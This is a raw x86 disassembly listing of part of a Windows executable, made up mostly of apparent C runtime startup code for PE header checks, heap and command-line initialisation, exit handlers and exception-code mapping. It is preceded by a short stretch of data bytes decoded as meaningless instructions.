  424346:	or     ebp,DWORD PTR [ecx-0x11]
  424349:	aaa    
  42434a:	mov    bl,BYTE PTR [ebp-0x52]
  42434d:	or     bh,al
  42434f:	in     al,0x78
  424351:	xor    edi,eax
  424353:	adc    ah,ah
  424355:	pop    edi
  424356:	push   ss
  424357:	cmp    BYTE PTR [eax],cl
  424359:	out    dx,eax
  42435a:	daa    
  42435b:	cmp    cl,al
  42435d:	mov    ds:0xa591a2b4,al
  424362:	and    eax,0x66ab46ea
  424367:	push   edx
  424368:	js     0x424378
  42436a:	jmp    0x4b9bc31c
  42436f:	std    
  424370:	jb     0x424306
  424372:	adc    al,0xaa
  424374:	gs cld 
  424376:	mov    ah,0xa2
  424378:	addr16 push edx
  42437a:	mov    dl,0xeb
  42437c:	daa    
  42437d:	nop
  42437e:	sub    BYTE PTR [ebx],dh
  424380:	cmp    edi,0xffffffc4
  424383:	clc    
  424384:	sub    ah,dl
  424386:	nop
  424387:	wbinvd 
  424389:	dec    ebx
  42438a:	stc    
  42438b:	jge    0x4243d6
  42438d:	add    DWORD PTR [edi+0x3a37f848],ebx
  424393:	and    al,0x6f
  424395:	repz jmp DWORD PTR ds:0xdf864a3
  42439c:	pop    ebp
  42439d:	bound  ebx,QWORD PTR [edx-0x6b]
  4243a0:	fcomp  QWORD PTR [edi-0x5dbce7f4]
  4243a6:	or     esi,DWORD PTR [edi+esi*2-0x6be70ee8]
  4243ad:	sbb    al,0xa5
  4243af:	jns    0x424430
  4243b1:	cld    
  4243b2:	xor    ah,bl
  4243b4:	inc    esi
  4243b5:	sub    ch,BYTE PTR [edi+0x2a]
  4243b8:	das    
  4243b9:	xchg   ecx,eax
  4243ba:	push   ecx
  4243bb:	lahf   
  4243bc:	and    edx,DWORD PTR [ebx]
  4243be:	loopne 0x424408
  4243c0:	call   0x9d04:0xfba10e6c
  4243c7:	jae    0x424401
  4243c9:	(bad)  
  4243ca:	mov    WORD PTR [edi+0x2d],cs
  4243cd:	add    edi,DWORD PTR [esi]
  4243cf:	frstor [ebx-0x60]
  4243d2:	fisttp DWORD PTR [ecx-0x68]
  4243d5:	test   BYTE PTR [ebx],cl
  4243d7:	lock pop edi
  4243d9:	inc    esi
  4243da:	mov    esi,ebp
  4243dc:	retf   0x740c
  4243df:	das    
  4243e0:	push   ecx
  4243e1:	mov    edx,0x802945be
  4243e6:	cmp    al,0xe7
  4243e8:	adc    ah,ah
  4243ea:	mov    ebp,0x53d43929
  4243ef:	push   cs
  4243f0:	cmp    esi,edx
  4243f2:	sub    eax,0x7ed9a45d
  4243f7:	push   edi
  4243f8:	aaa    
  4243f9:	dec    esi
  4243fa:	das    
  4243fb:	add    dl,ch
  4243fd:	into   
  4243fe:	push   0x0
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
